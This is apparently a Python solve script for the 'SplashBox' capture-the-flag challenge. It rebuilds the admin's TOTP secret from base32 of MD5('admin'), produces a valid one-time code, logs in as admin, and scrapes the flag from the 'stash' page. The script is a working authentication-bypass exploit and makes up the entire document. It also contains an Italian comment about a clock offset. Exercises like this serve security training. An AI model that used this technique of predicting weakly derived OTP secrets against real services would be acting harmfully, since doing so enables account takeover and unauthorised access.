from base64 import b32encode
from hashlib import md5
from bs4 import BeautifulSoup
import requests, pyotp, os, time

s = requests.Session()
url = "http://splashbox.challs.olicyber.it/"

secret = b32encode(md5(b'admin').hexdigest().encode()).decode().replace("=", "").lower()
payload = f"otpauth://totp/SplashBox:admin?secret={secret}&issuer=SplashBox"
otp = pyotp.parse_uri(payload)

payload = {
    "username":"admin",
    "otpcode":otp.at(int(time.time()) - 60)     # Per qualche motivo lo genera avanti di 2 codici lol
}
s.post(url + "otp.php", data=payload)

r = s.get(url + "?page=stash")

soup = BeautifulSoup(r.text, "html.parser")
flag = soup.find_all("p", {"class":"card-text"})
print(flag[1].text)